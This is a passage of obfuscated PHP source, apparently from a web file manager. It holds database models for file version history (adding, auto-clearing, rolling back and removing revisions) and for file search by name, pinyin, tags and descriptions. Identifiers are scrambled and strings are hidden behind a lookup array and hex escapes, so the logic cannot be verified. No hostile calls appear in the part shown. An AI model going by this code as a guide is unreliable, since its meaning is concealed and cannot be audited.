ÔóÏ´±[$˜îâ[411]] . $˜îâ[12]; } } $ìŞ¡Õœ— = array_merge($ìŞ¡Õœ—, $å¼¼¸¾œ, array($¢¢½‹ôÖ . $˜îâ[12])); $ìŞ¡Õœ— = array_unique($ìŞ¡Õœ—); $ÛŒ¶ê¯Œ = array_unique(array_to_keyvalue($Ö¥Â›©ö, $˜îâ[12], $˜îâ[1669])); $–üîµá = Model($˜îâ[544])->userListInfo($ÛŒ¶ê¯Œ); $äÎÔ§İñ = Model($˜îâ[831])->sourceListInfo($ìŞ¡Õœ—, !0); foreach ($Ö¥Â›©ö as &$ï’¬ ”™) { if ($ï’¬ ”™[$˜îâ[33]] == $˜îâ[566] && isset($ï’¬ ”™[$˜îâ[462]][$˜îâ[1163]])) { $ï’¬ ”™[$˜îâ[462]][$˜îâ[1163]] = $äÎÔ§İñ[$ï’¬ ”™[$˜îâ[462]][$˜îâ[1163]]]; $ï’¬ ”™[$˜îâ[462]][$˜îâ[1164]] = $äÎÔ§İñ[$ï’¬ ”™[$˜îâ[462]][$˜îâ[1164]]]; } if ($ï’¬ ”™[$˜îâ[33]] == $˜îâ[2091] && isset($ï’¬ ”™[$˜îâ[462]][$˜îâ[411]])) { $ï’¬ ”™[$˜îâ[462]][$˜îâ[411]] = $äÎÔ§İñ[$ï’¬ ”™[$˜îâ[462]][$˜îâ[411]]]; } $ï’¬ ”™[$˜îâ[86]] = $äÎÔ§İñ[$ï’¬ ”™[$˜îâ[411]]]; $ï’¬ ”™[$˜îâ[2096]] = $äÎÔ§İñ[$ï’¬ ”™[$˜îâ[2081]]]; if ($ï’¬ ”™[$˜îâ[33]] == $˜îâ[1827]) { $ï’¬ ”™[$˜îâ[2096]] = $ï’¬ ”™[$˜îâ[86]]; $ï’¬ ”™[$˜îâ[2081]] = $ï’¬ ”™[$˜îâ[2096]][$˜îâ[411]]; $ï’¬ ”™[$˜îâ[86]] = !1; $ï’¬ ”™[$˜îâ[411]] = $˜îâ[12]; } $ï’¬ ”™[$˜îâ[2026]] = $–üîµá[$ï’¬ ”™[$˜îâ[1669]]]; } unset($ï’¬ ”™); $ä¦òº±[$˜îâ[378]] = $Ö¥Â›©ö; return $ä¦òº±; } public function removeBySource($¿ã‘³¾) { $´ûÜ€Î = array($_SERVER[Ü©»’·][426] => $¿ã‘³¾); $this->where($´ûÜ€Î)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\143\145\137\x68\x69\x73\x74\157\x72\x79"; public function historyCount($àñ‰Ô³) { $Ó†ëÁê« =& $_SERVER[Ü©»’·]; if (!$àñ‰Ô³) { return array(); } if (is_string($àñ‰Ô³) || is_int($àñ‰Ô³)) { $àñ‰Ô³ = array($àñ‰Ô³); } $è–•Äªã = array($Ó†ëÁê«[411], $Ó†ëÁê«[1891] => $Ó†ëÁê«[509]); $ø®—§˜© = array($Ó†ëÁê«[411] => array($Ó†ëÁê«[7], $àñ‰Ô³)); $½ïşùŒş = $this->field($è–•Äªã)->where($ø®—§˜©)->group($Ó†ëÁê«[411])->select(); return array_to_keyvalue($½ïşùŒş, $Ó†ëÁê«[411], $Ó†ëÁê«[509]); } public function addHistory($ºÀ©ü, $¨àûÖ¸¼ = '') { $Öğíõ“Ú =& $_SERVER[Ü©»’·]; $¢šÌâ‹î = array($Öğíõ“Ú[426] => $ºÀ©ü[$Öğíõ“Ú[411]], $Öğíõ“Ú[1660] => isset($ºÀ©ü[$Öğíõ“Ú[465]]) ? $ºÀ©ü[$Öğíõ“Ú[465]] : $ºÀ©ü[$Öğíõ“Ú[463]], $Öğíõ“Ú[478] => $ºÀ©ü[$Öğíõ“Ú[477]], $Öğíõ“Ú[594] => $ºÀ©ü[$Öğíõ“Ú[76]], $Öğíõ“Ú[2097] => $¨àûÖ¸¼); if ($GLOBALS[$Öğíõ“Ú[6]][$Öğíõ“Ú[89]][$Öğíõ“Ú[1221]] >= 1) { $this->historyAutoClear($¢šÌâ‹î[$Öğíõ“Ú[411]]); $this->add($¢šÌâ‹î); } Hook::trigger($Öğíõ“Ú[2098], $¢šÌâ‹î); Model($Öğíõ“Ú[2099])->eventFileEdit($ºÀ©ü[$Öğíõ“Ú[411]]); } private function historyAutoClear($¨ÚÈ§ªš) { $«â…·—Ü =& $_SERVER[Ü©»’·]; $úÇ¦«ˆ÷ = Model($«â…·—Ü[776])->get($«â…·—Ü[1243]); $°‡éÑıŸ = $GLOBALS[$«â…·—Ü[6]][$«â…·—Ü[89]][$«â…·—Ü[1221]]; $ß½…Ë¼ = $úÇ¦«ˆ÷ == $«â…·—Ü[1244] ? min(5, $°‡éÑıŸ) : $°‡éÑıŸ; $ß½…Ë¼ = $ß½…Ë¼ <= 0 ? 0 : $ß½…Ë¼ - 1; if ($ß½…Ë¼ >= 500) { return; } $¾ƒ­”©» = array($«â…·—Ü[426] => $¨ÚÈ§ªš); $ñ¿¯ÌÊÅ = $this->field($«â…·—Ü[2100])->where($¾ƒ­”©»)->order($«â…·—Ü[2094])->select(); if (!$ñ¿¯ÌÊÅ || $ß½…Ë¼ >= count($ñ¿¯ÌÊÅ)) { return; } $å‹ïˆ— = array_to_keyvalue($ñ¿¯ÌÊÅ, $«â…·—Ü[12], $«â…·—Ü[408]); $å‹ïˆ— = array_slice($å‹ïˆ—, $ß½…Ë¼); $Œ‚ÃÓÈ¤ = array_to_keyvalue($ñ¿¯ÌÊÅ, $«â…·—Ü[12], $«â…·—Ü[477]); $Œ‚ÃÓÈ¤ = array_slice($Œ‚ÃÓÈ¤, $ß½…Ë¼); if (!$å‹ïˆ— || !$Œ‚ÃÓÈ¤) { return; } $¾ƒ­”©» = array($«â…·—Ü[428] => array($«â…·—Ü[7], $å‹ïˆ—)); $this->where($¾ƒ­”©»)->delete(); Model($«â…·—Ü[480])->remove($Œ‚ÃÓÈ¤); } public function listData($ùËùéş†) { $€±§İ×‡ =& $_SERVER[Ü©»’·]; $ö‡…º’‰ = array($€±§İ×‡[426] => $ùËùéş†); $ò­—¥À“ = $€±§İ×‡[2101]; $üÛŒ¤ïÜ = $this->field($ò­—¥À“)->where($ö‡…º’‰)->order($€±§İ×‡[2094])->selectPage(); $this->_listAppendUser($üÛŒ¤ïÜ[$€±§İ×‡[378]]); $åë¬¡Â¨ = Model($€±§İ×‡[776])->get($€±§İ×‡[1243]); $š—í’˜ = 5; if ($åë¬¡Â¨ == $€±§İ×‡[1244]) { $üÛŒ¤ïÜ[$€±§İ×‡[378]] = array_slice($üÛŒ¤ïÜ[$€±§İ×‡[378]], 0, $š—í’˜); $üÛŒ¤ïÜ[$€±§İ×‡[375]] = array($€±§İ×‡[2102] => 1, $€±§İ×‡[2103] => 20, $€±§İ×‡[2104] => 1, $€±§İ×‡[2105] => count($üÛŒ¤ïÜ[$€±§İ×‡[378]])); } return $üÛŒ¤ïÜ; } protected function _listAppendUser(&$›ÒÛ¦Ãã) { $˜Ü†¹îµ =& $_SERVER[Ü©»’·]; $©úşÍ ¡ = array_to_keyvalue($›ÒÛ¦Ãã, $˜Ü†¹îµ[12], $˜Ü†¹îµ[1669]); $°öÄ¯Ã” = Model($˜Ü†¹îµ[544])->userListInfo($©úşÍ ¡); foreach ($›ÒÛ¦Ãã as &$æ­“ßŠ¨) { $ËŒéå‹« = $æ­“ßŠ¨[$˜Ü†¹îµ[1669]]; $æ­“ßŠ¨[$˜Ü†¹îµ[463]] = $°öÄ¯Ã”[$ËŒéå‹«] ? $°öÄ¯Ã”[$ËŒéå‹«] : !1; } unset($æ­“ßŠ¨); } public function fileInfo($Áëı¶æ) { $ÚôÂ±ü =& $_SERVER[Ü©»’·]; $Î•ÓÀ = $this->tablePrefix; $´¶íÛ = "{$Î•ÓÀ}\151\x6f\x5f\x66\x69\x6c\145\x20\x66\151\x6c\x65\163\40\x6f\156\x20\x66\151\154\x65\163\x2e\146\x69\154\145\111\104\40\x3d\40\x68\151\x73\164\x6f\x72\171\56\x66\x69\x6c\x65\111\104"; return $this->alias($ÚôÂ±ü[2106])->where(array($ÚôÂ±ü[428] => $Áëı¶æ))->join($´¶íÛ, $ÚôÂ±ü[2107])->find(); } public function removeItem($’éîŠ®ì) { $¨…ä¢ß˜ =& $_SERVER[Ü©»’·]; $éÎª×éÈ = array($¨…ä¢ß˜[428] => $’éîŠ®ì); $îáñÒ¥û = $this->where($éÎª×éÈ)->find(); if ($îáñÒ¥û) { $•ñ²ûØÕ = $this->where($éÎª×éÈ)->delete(); Model($¨…ä¢ß˜[480])->remove($îáñÒ¥û[$¨…ä¢ß˜[477]]); return $•ñ²ûØÕ; } return !1; } public function removeBySource($‚ Ï¥ÊÎ) { $™êŞà· =& $_SERVER[Ü©»’·]; if (!$‚ Ï¥ÊÎ) { return !1; } if (!is_array($‚ Ï¥ÊÎ)) { $‚ Ï¥ÊÎ = array($‚ Ï¥ÊÎ); } $ªœı£Ûö = array($™êŞà·[426] => array($™êŞà·[7], $‚ Ï¥ÊÎ)); $ö¹†Ç¾™ = $this->field($™êŞà·[478])->where($ªœı£Ûö)->select(); if ($ö¹†Ç¾™) { $this->where($ªœı£Ûö)->delete(); $å¨×â•è = array_to_keyvalue($ö¹†Ç¾™, $™êŞà·[12], $™êŞà·[477]); Model($™êŞà·[480])->remove($å¨×â•è); } return !0; } public function setDetail($´İ‰°õÖ, $†…½ñŠ) { $áÇó¬úƒ =& $_SERVER[Ü©»’·]; return $this->where(array($áÇó¬úƒ[428] => $´İ‰°õÖ))->save(array($áÇó¬úƒ[2097] => $†…½ñŠ)); } public function rollbackToItem($ºíé³Ø, $¦¥‹ùÎƒ) { $ãŸÜÙô =& $_SERVER[Ü©»’·]; $˜à‡Ì° = Model($ãŸÜÙô[831])->sourceInfo($ºíé³Ø); $this->addHistory($˜à‡Ì°, LNG($ãŸÜÙô[2108])); $ı¬èÄÛÊ = $this->find($¦¥‹ùÎƒ); $ôÓàŠ¡ = array($ãŸÜÙô[477] => $ı¬èÄÛÊ[$ãŸÜÙô[477]], $ãŸÜÙô[76] => $ı¬èÄÛÊ[$ãŸÜÙô[76]], $ãŸÜÙô[85] => time(), $ãŸÜÙô[465] => USER_ID); Model($ãŸÜÙô[831])->where(array($ãŸÜÙô[411] => $ºíé³Ø))->save($ôÓàŠ¡); return $this->where(array($ãŸÜÙô[428] => $¦¥‹ùÎƒ))->delete(); } public function clearSame($ç®‡“À¹) { $Å£æ¦Ë¼ =& $_SERVER[Ü©»’·]; $ÙæÖ‡Ç¦ = $this->listData($ç®‡“À¹); $³‚‹¶¹Ã = array_to_keyvalue_group($ÙæÖ‡Ç¦, $Å£æ¦Ë¼[477]); $´Øàí ê = array(); $ˆ›˜Ò«³ = array(); foreach ($³‚‹¶¹Ã as $ÚİÅÎ“½) { if (!$ÚİÅÎ“½ || count($ÚİÅÎ“½) <= 1) { continue; } foreach ($ÚİÅÎ“½ as $´Ù Ò‘) { $´Øàí ê[] = $´Ù Ò‘[$Å£æ¦Ë¼[477]]; $ˆ›˜Ò«³[] = $´Ù Ò‘[$Å£æ¦Ë¼[408]]; } } if (!$ˆ›˜Ò«³) { return; } $this->where(array($Å£æ¦Ë¼[408] => array($Å£æ¦Ë¼[7], $ˆ›˜Ò«³)))->delete(); Model($Å£æ¦Ë¼[480])->remove($´Øàí ê); } public function userSpace() { $™Ñéœ«Ì =& $_SERVER[Ü©»’·]; $èÚÇ·Ø = $this->tablePrefix; $ÃòµÂ = array($™Ñéœ«Ì[1660] => USER_ID); $üñ–í = "{$èÚÇ·Ø}\x69\157\137\x66\151\154\145\x20\146\x69\x6c\x65\x73\x20\x6f\156\40\146\x69\x6c\145\x73\x2e\146\151\154\x65\x49\x44\x20\x3d\x20\150\151\163\x74\157\162\171\56\x66\x69\154\x65\111\x44"; return $this->alias($™Ñéœ«Ì[2106])->where($ÃòµÂ)->join($üñ–í, $™Ñéœ«Ì[2107])->sum($™Ñéœ«Ì[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Çı—®ªĞ) { $¿¦‰Ô·Œ =& $_SERVER[Ü©»’·]; $·ÃÄ“ÏÒ = KodIO::fileTypeList(); $¸ŠÆ•­Ë = $·ÃÄ“ÏÒ[$Çı—®ªĞ]; if (!$¸ŠÆ•­Ë) { return array(); } $ÎúÙÃ‚± = $¸ŠÆ•­Ë[$¿¦‰Ô·Œ[174]]; $“ËîáüŸ = $¿¦‰Ô·Œ[7]; if (!$¸ŠÆ•­Ë[$¿¦‰Ô·Œ[174]]) { $ÓÅÓ«„ß = array_to_keyvalue($·ÃÄ“ÏÒ, $¿¦‰Ô·Œ[12], $¿¦‰Ô·Œ[174]); $ÎúÙÃ‚± = implode($¿¦‰Ô·Œ[50], $ÓÅÓ«„ß); $“ËîáüŸ = $¿¦‰Ô·Œ[2109]; } $ş¨€åı£ = explode($¿¦‰Ô·Œ[50], trim($ÎúÙÃ‚±, $¿¦‰Ô·Œ[50])); return array($“ËîáüŸ, $ş¨€åı£); } public function listPathType($Ç¡ÇİŒ½) { $Ç´Õ³€À =& $_SERVER[Ü©»’·]; $ñ´®˜ÑÉ = $this->fileTypeWhere($Ç¡ÇİŒ½); if (!$ñ´®˜ÑÉ) { return array(); } $›•“è¤† = USER_ID; $—Çóë = Model($Ç´Õ³€À[544])->getInfo($›•“è¤†); $”…¬ÁŠ± = array($Ç´Õ³€À[595] => SourceModel::TYPE_USER, $Ç´Õ³€À[530] => array($Ç´Õ³€À[559], $Ç´Õ³€À[540] . $—Çóë[$Ç´Õ³€À[86]][$Ç´Õ³€À[411]] . $Ç´Õ³€À[560]), $Ç´Õ³€À[596] => $›•“è¤†, $Ç´Õ³€À[592] => 0, $Ç´Õ³€À[593] => $ñ´®˜ÑÉ); return $this->listSource($”…¬ÁŠ±); } public function listSearch($áºªÄîß, $ÚíèŸõ = 300) { $†ÜŸµè¶ =& $_SERVER[Ü©»’·]; if (isset($áºªÄîß[$†ÜŸµè¶[1952]]) && $áºªÄîß[$†ÜŸµè¶[1952]]) { $áºªÄîß[$†ÜŸµè¶[1952]] = str_replace($†ÜŸµè¶[393], $†ÜŸµè¶[2110], trim($áºªÄîß[$†ÜŸµè¶[1952]])); } $ëÏ£‘ëÉ = $this->_parseSearchWhere($áºªÄîß); if (!isset($ëÏ£‘ëÉ[$†ÜŸµè¶[440]])) { $ëÏ£‘ëÉ[$†ÜŸµè¶[440]] = 0; } $³Ë·„¶˜ = $†ÜŸµè¶[2111]; $¼„èúÆ€ = $ëÏ£‘ëÉ; $½ÇµÁ°ï = $³Ë·„¶˜; $this->_listSearchBindPinyin($áºªÄîß, $ëÏ£‘ëÉ, $³Ë·„¶˜); $this->alias($†ÜŸµè¶[455])->_makeOrder(); $ëÏ£‘ëÉ = $this->parseWhereLike($ëÏ£‘ëÉ); $›Ø²€ûÖ = $this->distinct(!0)->field($³Ë·„¶˜)->where($ëÏ£‘ëÉ)->selectPage($ÚíèŸõ); if ($GLOBALS[$†ÜŸµè¶[6]][$†ÜŸµè¶[390]][$†ÜŸµè¶[391]] && Input::check($áºªÄîß[$†ÜŸµè¶[1952]], $†ÜŸµè¶[602]) && $›Ø²€ûÖ[$†ÜŸµè¶[375]][$†ÜŸµè¶[353]] == 1 && $›Ø²€ûÖ[$†ÜŸµè¶[375]][$†ÜŸµè¶[376]] == 0) { $›Ø²€ûÖ = $this->distinct(!0)->field($³Ë·„¶˜)->where($¼„èúÆ€)->limit(1000)->select(); $›Ø²€ûÖ = array_page_split($›Ø²€ûÖ, !1, $ÚíèŸõ); } $this->_listSearchFileContent($›Ø²€ûÖ, $áºªÄîß, $½ÇµÁ°ï, $¼„èúÆ€); $this->_listSearchDesc($›Ø²€ûÖ, $áºªÄîß, $½ÇµÁ°ï); $this->_listSearchTag($›Ø²€ûÖ, $áºªÄîß, $½ÇµÁ°ï); $this->_listSearchGroupTag($›Ø²€ûÖ, $áºªÄîß, $½ÇµÁ°ï); $this->_listDataApply($›Ø²€ûÖ[$†ÜŸµè¶[378]]); $this->_listMake($›Ø²€ûÖ); return $›Ø²€ûÖ; } private function _listSearchFileContent(&$Å©˜·íØ, $½îİ¸é´, $¾úˆ†Í, $¦ÎÏ¿µë) { $ÅßßÄŠë =& $_SERVER[Ü©»’·]; if (!$½îİ¸é´[$ÅßßÄŠë[1952]] || $Å©˜·íØ[$ÅßßÄŠë[375]][$ÅßßÄŠë[353]] > 1) { return; } if (!isset($¦ÎÏ¿µë[$ÅßßÄŠë[32]]) || !is_array($½îİ¸é´[$ÅßßÄŠë[477]])) { return; } $¦ÎÏ¿µë[$ÅßßÄŠë[477]] = array($ÅßßÄŠë[7], $½îİ¸é´[$ÅßßÄŠë[477]]); unset($¦ÎÏ¿µë[$ÅßßÄŠë[32]]); unset($½îİ¸é´[$ÅßßÄŠë[477]]); $ŠõÄŞè¾ = $this->field($¾úˆ†Í)->where($¦ÎÏ¿µë)->limit($ÅßßÄŠë[2112])->select(); if (!$ŠõÄŞè¾ || count($ŠõÄŞè¾) == 0) { return; } $Å©˜·íØ[$ÅßßÄŠë[378]] = array_merge($ŠõÄŞè¾, $Å©˜·íØ[$ÅßßÄŠë[378]]); $Å©˜·íØ[$ÅßßÄŠë[375]][$ÅßßÄŠë[376]] += count($ŠõÄŞè¾); } private function _listSearchTag(&$Ú¡ƒ èÉ, $ıĞè½–¨, $ç¿ßÕÕ“) { $˜—ÈáÍ =& $_SERVER[Ü©»’·]; if (!$ıĞè½–¨[$˜—ÈáÍ[1952]] || $Ú¡ƒ èÉ[$˜—ÈáÍ[375]][$˜—ÈáÍ[353]] > 1) { return; } $ø¿‘¡º = Model($˜—ÈáÍ[2113])->listData(); $¿¾ï»¡İ = array(); $Ø•ï¹€ = $ıĞè½–¨[$˜—ÈáÍ[1952]]; foreach ($ø¿‘¡º as $Ãœ¦®ö) { $íî„ò¨ö = $Ãœ¦®ö[$˜—ÈáÍ[32]]; $İÀÎ•±ê = str_replace($˜—ÈáÍ[53], $˜—ÈáÍ[12], Pinyin::get($íî„ò¨ö)); if (stripos($íî„ò¨ö, $Ø•ï¹€) !== !1 || stripos($İÀÎ•±ê, $Ø•ï¹€) !== !1) { $¿¾ï»¡İ[] = $Ãœ¦®ö[$˜—ÈáÍ[408]]; } } if (!$¿¾ï»¡İ) { return; } $¶¥‹˜¦ = array($˜—ÈáÍ[435] => array($˜—ÈáÍ[7], $¿¾ï»¡İ), $˜—ÈáÍ[1669] => USER_ID); $±¤±µ¢Û = Model($˜—ÈáÍ[437])->field($˜—ÈáÍ[84])->where($¶¥‹˜¦)->select(); $±¤±µ¢Û = array_to_keyvalue($±¤±µ¢Û, $˜—ÈáÍ[12], $˜—ÈáÍ[84]); $Ê³ôÊ‚ = array_unique($±¤±µ¢Û); $this->_listSearchMerge($Ú¡ƒ èÉ, $ıĞè½–¨, $ç¿ßÕÕ“, $Ê³ôÊ‚); } private function _listSearchDesc(&$™óÒµüõ, $ğ÷Ì¥Ù½, $…›ÔÊŠê) { $¢«ë™‰± =& $_SERVER[Ü©»’·]; if (!$ğ÷Ì¥Ù½[$¢«ë™‰±[1952]] || $™óÒµüõ[$¢«ë™‰±[375]][$¢«ë™‰±[353]] > 1) { return; } $å‚Í÷š = array($¢«ë™‰±[94] => $¢«ë™‰±[462], $¢«ë™‰±[383] => array($¢«ë™‰±[392], $¢«ë™‰±[1954] . $ğ÷Ì¥Ù½[$¢«ë™‰±[1952]] . $¢«ë™‰±[1954])); $ˆƒ”ÁáÁ = !1; if ($ˆƒ”ÁáÁ) { $´ù“Îß™ = $this->listSearchChildren($ğ÷Ì¥Ù½[$¢«ë™‰±[441]]); $´ù“Îß™ = array_unique($´ù“Îß™); if (!$´ù“Îß™) { return; } $å‚Í÷š[$¢«ë™‰±[411]] = array($¢«ë™‰±[7], $´ù“Îß™); } $«€†Ì¥÷ = Model($¢«ë™‰±[578])->field($¢«ë™‰±[411])->where($å‚Í÷š)->limit(5000)->select(); $‰¢Ñ¥Ü¤ = array_to_keyvalue($«€†Ì¥÷, $¢«ë™‰±[12], $¢«ë™‰±[411]); $this->_listSearchMerge($™óÒµüõ, $ğ÷Ì¥Ù½, $…›ÔÊŠê, $‰¢Ñ¥Ü¤); } private function _listSearchGroupTag(&$ÜôˆÑ²Ü, $ï‘ô®©‹, $½öœª) { $Î£¥Ÿæ« =& $_SERVER[Ü©»’·]; if (!$ï‘ô®©‹[$Î£¥Ÿæ«[1952]] || $ÜôˆÑ²Ü[$Î£¥Ÿæ«[375]][$Î£¥Ÿæ«[353]] > 1 || !$ï‘ô®©‹[$Î£¥Ÿæ«[441]]) { return; } $ìÛ¬ğ– = $this->sourceInfo($ï‘ô®©‹[$Î£¥Ÿæ«[441]]); if (!$ìÛ¬ğ– || $ìÛ¬ğ–[$Î£¥Ÿæ«[420]] != SourceModel::TYPE_GROUP) { return; } $ß¬Ó«±¾ = $ìÛ¬ğ–[$Î£¥Ÿæ«[514]]; $Ñ ‡ˆöØ = Model($Î£¥Ÿæ«[2114])->get($ß¬Ó«±¾); $ÊòĞÔ = array(); $¶Áª‘ÍŒ = $ï‘ô®©‹[$Î£¥Ÿæ«[1952]]; foreach ($Ñ ‡ˆöØ[$Î£¥Ÿæ«[378]] as $öÅÛõ„’) { $£ÓŞš†ï = $öÅÛõ„’[$Î£¥Ÿæ«[32]]; $˜•·™Øº = str_replace($Î£¥Ÿæ«[53], $Î£¥Ÿæ«[12], Pinyin::get($£ÓŞš†ï)); if (stripos($£ÓŞš†ï, $¶Áª‘ÍŒ) !== !1 || stripos($˜•·™Øº, $¶Áª‘ÍŒ) !== !1) { $ÊòĞÔ[] = $öÅÛõ„’[$Î£¥Ÿæ«[408]]; } } if (!$ÊòĞÔ) { return; } $ØŒƒˆóº = array($Î£¥Ÿæ«[435] => array($Î£¥Ÿæ«[7], $ÊòĞÔ), $Î£¥Ÿæ«[1669] => 0, $Î£¥Ÿæ«[33] => $Î£¥Ÿæ«[1974] . $ß¬Ó«±¾); $‰Ö—æ®… = Model($Î£¥Ÿæ«[437])->field($Î£¥Ÿæ«[84])->where($ØŒƒˆóº)->select(); $‰Ö—æ®… = array_to_keyvalue($‰Ö—æ®…, $Î£¥Ÿæ«[12], $Î£¥Ÿæ«[84]); $ë¹¶·¥ = array_unique($‰Ö—æ®…); $this->_listSearchMerge($ÜôˆÑ²Ü, $ï‘ô®©‹, $½öœª, $ë¹¶·¥); } private function _listSearchMerge(&$“ÇéšÉ, $Éêêûã, $™Œİ¤™”, $˜úÙŞÕ¿) { $äÙÒ´™ =& $_SERVER[Ü©»’·]; if (!$˜úÙŞÕ¿) { return; } $å¬ÓìÕé = array_to_keyvalue($“ÇéšÉ[$äÙÒ´™[378]], $äÙÒ´™[12], $äÙÒ´™[411]); $ÊÑ‹İ¤© = array_diff($˜úÙŞÕ¿, $å¬ÓìÕé); if (!$ÊÑ‹İ¤©) { return; } $©ãç“É¡ = array($äÙÒ´™[411] => array($äÙÒ´™[7], $ÊÑ‹İ¤©)); $û´Ü€¾ = $this->field($™Œİ¤™”)->where($©ãç“É¡)->select(); if (!$û´Ü€¾) { return; } $Ñ­ÏáÕ´ = array(); foreach ($û´Ü€¾ as $´ÀŞ†¯) { if ($this->_listSearchFilter($´ÀŞ†¯, $Éêêûã)) { $Ñ­ÏáÕ´[] = $´ÀŞ†¯; } } $“ÇéšÉ[$äÙÒ´™[378]] = array_merge($Ñ­ÏáÕ´, $“ÇéšÉ[$äÙÒ´™[378]]); $“ÇéšÉ[$äÙÒ´™[375]][$äÙÒ´™[376]] += count($Ñ­ÏáÕ´); } private function _listSearchFilter($Åƒ‰È€ı, $¶«ˆ¢„À) { $è­ô³Ûâ =& $_SERVER[Ü©»’·]; $†·€ü‰ = $Åƒ‰È€ı[$è­ô³Ûâ[419]] == $è­ô³Ûâ[88]; if (!strstr($Åƒ‰È€ı[$è­ô³Ûâ[530]], $è­ô³Ûâ[50] . $¶«ˆ¢„À[$è­ô³Ûâ[441]] . $è­ô³Ûâ[50])) { return !1; } if (isset($¶«ˆ¢„À[$è­ô³Ûâ[421]]) && $¶«ˆ¢„À[$è­ô³Ûâ[421]] != $è­ô³Ûâ[1913]) { if ($¶«ˆ¢„À[$è­ô³Ûâ[421]] == $è­ô³Ûâ[75] && !$†·€ü‰) { return !1; } if ($¶«ˆ¢„À[$è­ô³Ûâ[421]] != $è­ô³Ûâ[75] && $†·€ü‰) { return !1; } if (!strstr($Åƒ‰È€ı[$è­ô³Ûâ[174]], $è­ô³Ûâ[50] . $¶«ˆ¢„À[$è­ô³Ûâ[421]] . $è­ô³Ûâ[50])) { return !1; } } if (isset($¶«ˆ¢„À[$è­ô³Ûâ[2115]]) && $¶«ˆ¢„À[$è­ô³Ûâ[2115]] < $Åƒ‰È€ı[$è­ô³Ûâ[76]]) { return !1; } if (isset($¶«ˆ¢„À[$è­ô³Ûâ[2116]]) && $¶«ˆ¢„À[$è­ô³Ûâ[2116]] > $Åƒ‰È€ı[$è­ô³Ûâ[76]]) { return !1; } if (isset($¶«ˆ¢„À[$è­ô³Ûâ[609]]) && $¶«ˆ¢„À[$è­ô³Ûâ[609]] != $Åƒ‰È€ı[$è­ô³Ûâ[465]]) { return !1; } return !0; } public function listSearchChildren($¤ÇŞ²òŒ, $“úÈş«³ = 5000) { $ÒË·Ó¤ =& $_SERVER[Ü©»’·]; $¿•îÂ˜Ş = array(); $ƒªú¹ß± = $this->sourceInfo($¤ÇŞ²òŒ); $”Ò†ÆÍº = array($ÒË·Ó¤[530] => array($ÒË·Ó¤[392], $ƒªú¹ß±[$ÒË·Ó¤[530]] . $ƒªú¹ß±[$ÒË·Ó¤[411]] . $ÒË·Ó¤[560])); $µÁÙ ò  = $this->field($ÒË·Ó¤[76])->where($”Ò†ÆÍº)->limit($“úÈş«³ + 1)->select(); $”Çğ¨şŞ = is_array($µÁÙ ò ) ? count($µÁÙ ò ) : 0; if ($”Çğ¨şŞ > $“úÈş«³) { return $this->_listSearchChildrenNear($¤ÇŞ²òŒ, $“úÈş«³); } $Ü•˜ÂÜ = $this->field($ÒË·Ó¤[411])->where($”Ò†ÆÍº)->select(); $¿•îÂ˜Ş = array_to_keyvalue($Ü•˜ÂÜ, $ÒË·Ó¤[12], $ÒË·Ó¤[411]); return $¿•îÂ˜Ş; } private function _listSearchChildrenNear($·Åéö€Ñ, $íã£¨°ó) { $•¥Œ¢ç´ =& $_SERVER[Ü©»’·]; $ª™İŠ—î = array(); $¶õ‚Ã¼œ = array($•¥Œ¢ç´[441] => $·Åéö€Ñ); $˜íÊµâù = $this->field($•¥Œ¢ç´[2117])->where($¶õ‚Ã¼œ)->select(); $ûĞÎÉã = array_to_keyvalue(array_filter_by_field($˜íÊµâù, $•¥Œ¢ç´[419], $•¥Œ¢ç´[88]), $•¥Œ¢ç´[12], $•¥Œ¢ç´[411]); $ª™İŠ—î = array_merge($ª™İŠ—î, array_to_keyvalue($˜íÊµâù, $•¥Œ¢ç´[12], $•¥Œ¢ç´[411])); if (!$ûĞÎÉã) { return $ª™İŠ—î; } $¶õ‚Ã¼œ = array($•¥Œ¢ç´[441] => array($•¥Œ¢ç´[7], $ûĞÎÉã)); $˜íÊµâù = $this->field($•¥Œ¢ç´[2117])->where($¶õ‚Ã¼œ)->limit($íã£¨°ó)->select(); $ª™İŠ—î = array_merge($ª™İŠ—î, array_to_keyvalue($˜íÊµâù, $•¥Œ¢ç´[12], $•¥Œ¢ç´[411])); $ª™İŠ—î = array_slice($ª™İŠ—î, 0, $íã£¨°ó); return $ª™İŠ—î; } private function _listSearchBindPinyin($Ä–¿…€†, &$ï€šûÕŞ, &$™´üƒÊ¾) { $ŸÑÔ­òÙ =& $_SERVER[Ü©»’·]; if (!isset($Ä–¿…€†[$ŸÑÔ­òÙ[1952]]) || !$Ä–¿…€†[$ŸÑÔ­òÙ[1952]]) { return; } if (!Input::check($Ä–¿…€†[$ŸÑÔ­òÙ[1952]], $ŸÑÔ­òÙ[318]) || strlen($Ä–¿…€†[$ŸÑÔ­òÙ[1952]]) < 2) { return; } $ÇÉ¬Ô”¤ = "\x4c\x45\x46\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\137\x73\x6f\165\162\143\x65\x5f\x6d\145\164\x61\40\x6d\145\x74\x61\x20\x6f\x6e\x20\x73\x6f\165\162\x63\x65\x2e\x73\x6f\165\x72\143\x65\111\x44\x20\75\x20\x6d\145\x74\x61\56\163\157\165\162\x63\x65\x49\x44"; $‚‡Ô“—Ş = array(); $™´üƒÊ¾ = str_replace(array($ŸÑÔ­òÙ[231], $ŸÑÔ­òÙ[53], $ŸÑÔ­òÙ[2118]), $ŸÑÔ­òÙ[12], $™´üƒÊ¾); $™´üƒÊ¾ = $ŸÑÔ­òÙ[447] . str_replace($ŸÑÔ­òÙ[50], $ŸÑÔ­òÙ[448], $™´üƒÊ¾); $Ÿ‹Öı = $ï€šûÕŞ[$ŸÑÔ­òÙ[32]]; unset($ï€šûÕŞ[$ŸÑÔ­òÙ[32]]); foreach ($ï€šûÕŞ as $Å¸Âäû¿ => $Şşà) { $‚‡Ô“—Ş[$ŸÑÔ­òÙ[447] . $Å¸Âäû¿] = $Şşà; } foreach ($Ÿ‹Öı as $»í—ÛïÎ) { $‚‡Ô“—Ş[] = array($ŸÑÔ­òÙ[452] => $»í—ÛïÎ, $ŸÑÔ­òÙ[1003] => $ŸÑÔ­òÙ[1956], array($ŸÑÔ­òÙ[2119] => $»í—ÛïÎ, $ŸÑÔ­òÙ[2120] => array($ŸÑÔ­òÙ[7], array($ŸÑÔ­òÙ[474], $ŸÑÔ­òÙ[473])))); } $this->join($ÇÉ¬Ô”¤); $ï€šûÕŞ = $‚‡Ô“—Ş; } private function 